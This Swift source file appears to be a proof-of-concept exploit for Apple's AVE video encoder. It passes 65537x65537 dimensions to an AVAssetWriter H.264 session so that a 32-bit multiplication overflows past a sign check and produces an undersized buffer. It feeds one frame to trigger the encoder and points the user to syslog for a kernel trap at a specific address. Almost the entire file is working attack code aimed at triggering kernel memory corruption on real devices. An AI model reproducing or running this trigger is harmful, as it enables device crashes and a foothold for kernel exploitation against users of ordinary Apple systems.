// AVERunner — drives the AVE encoding session with overflow dims
import AVFoundation
import VideoToolbox

final class AVERunner {
    static let shared = AVERunner()
    private init() {}

    // 32-bit mul overflow: (65537 * 65537) mod 2^32 = 0x20001 (small positive)
    // passes the tbnz #0x1f negative check in DPB config, yields small bufSize
    private let overflowW = 65537
    private let overflowH = 65537

    func start(_ report: @escaping (String) -> Void) {
        let dims = "dims: \(overflowW)x\(overflowH) -> 32-bit product 0x20001\n"
        report(dims)

        let url = FileManager.default.temporaryDirectory.appendingPathComponent("poc.mov")
        try? FileManager.default.removeItem(at: url)

        guard let writer = try? AVAssetWriter(url: url, fileType: .mov) else {
            report("AVAssetWriter init failed"); return
        }
        let settings: [String: Any] = [
            AVVideoCodecKey: AVVideoCodecType.h264,
            AVVideoWidthKey: overflowW,
            AVVideoHeightKey: overflowH,
            AVVideoCompressionPropertiesKey: [
                AVVideoAverageBitRateKey: 1_000_000,
                AVVideoMaxKeyFrameIntervalKey: 30,
            ],
        ]
        guard let input = AVAssetWriterInput(mediaType: .video, outputSettings: settings) else {
            report("input init failed"); return
        }
        if writer.canAdd(input) { writer.add(input) } else {
            report("cannot add input"); return
        }

        writer.startWriting()
        writer.startSession(atSourceTime: .zero)
        report("session started")

        // Feed one frame to force encoder start
        let adaptor = AVAssetWriterInputPixelBufferAdaptor(
            assetWriterInput: input,
            sourcePixelBufferAttributes: [
                kCVPixelBufferPixelFormatTypeKey as String: kCVPixelFormatType_32BGRA,
                kCVPixelBufferWidthKey as String: 64,
                kCVPixelBufferHeightKey as String: 64,
            ])
        var pb: CVPixelBuffer?
        CVPixelBufferCreate(kCFAllocatorDefault, 64, 64,
                            kCVPixelFormatType_32BGRA, nil, &pb)
        if let p = pb, adaptor.append(p, withPresentationTime: .zero) {
            report("frame appended")
        } else {
            report("frame append failed (maybe dims rejected)")
        }

        input.markAsFinished()
        writer.finishWriting { [weak self] in
            guard let self = self else { return }
            let status = writer.status.rawValue
            let err = writer.error?.localizedDescription ?? "none"
            report("finishWriting status=\(status) err=\(err)")
            if let w = self as? AnyObject {} // no-op
            report("done — if device panicked check syslog for kernel trap near 0xfffffff0089f34f4")
        }
    }
}
